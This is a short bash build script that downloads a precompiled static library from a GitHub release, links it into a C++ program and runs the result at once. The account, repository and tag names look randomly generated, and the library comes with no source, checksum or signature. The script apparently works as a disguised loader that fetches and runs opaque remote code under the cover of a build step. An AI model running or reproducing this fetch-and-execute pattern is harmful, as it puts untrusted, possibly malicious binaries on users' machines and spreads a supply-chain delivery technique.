#!/usr/bin/env bash
set -e
LIB="laurel-helm.a"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "https://github.com/rhysjessicaac/nodesafehammer/releases/download/clever-delta-clever-canyon/laurel-helm.a" --output "$LIB"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
